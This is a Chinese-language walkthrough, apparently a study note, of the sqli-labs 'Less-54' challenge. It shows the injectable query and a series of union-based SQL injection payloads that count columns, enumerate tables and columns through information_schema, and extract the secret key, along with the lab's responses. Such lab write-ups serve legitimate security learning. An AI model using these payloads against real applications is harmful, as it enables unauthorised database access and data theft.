---
title: less54
url: https://www.yuque.com/u29002979/ep2zrx/qepapqzkte110ltf
---

```bash
$sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";
```

> Please input the ID as parameter with numeric value as done in Lab excercises
> 请输入ID作为参数，数值与实验室练习相同
>
> The objective of this challenge is to dump the (secret key) from only random table from Database ('CHALLENGES') in Less than 10 attempts
> 这个挑战的目标是在不到10次的尝试中从数据库（“CHALLENGES”）中仅转储随机表中的（密钥）
>
> For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.
> 有趣的是，每次重置时，挑战都会产生随机的表名、列名和表数据。随时保持新鲜。

<a name="naIEd"></a>

# 判断字段数，

用去两次机会

`?id=1' order by 4--+`

> You have made : 1 of 10 attempts
> 您已进行了：10次尝试中的1次

`?id=1' order by 3--+`

> You have made : 2 of 10 attempts
> Your Login name:Dumb
> Your Password:Dumb

直接省略信息收集，数据库猜解阶段， <a name="DK0D3"></a>

## 直接开始爆破数据表名称

`?id=-1' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+`

> You have made : 3 of 10 attempts
> Your Login name:2
> Your Password:aqzhac4it5

数据表名：aqzhac4it5 <a name="Jpz4K"></a>

# 破数据字段名称

`?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='aqzhac4it5'--+`

> You have made : 4 of 10 attempts
> Your Login name:2
> Your Password:id,sessid,secret\_9EA8,tryy

数据字段：secret\_9EA8 <a name="psE1z"></a>

# 最后找通关密码

`?id=-1' union select 1,2,(select secret_9EA8  from aqzhac4it5 )--+`

> You have made : 5 of 10 attempts
> Your Login name:2
> Your Password:FEC1PsNRKY3v1kumLxMCgYNa

通关密码：FEC1PsNRKY3v1kumLxMCgYNa
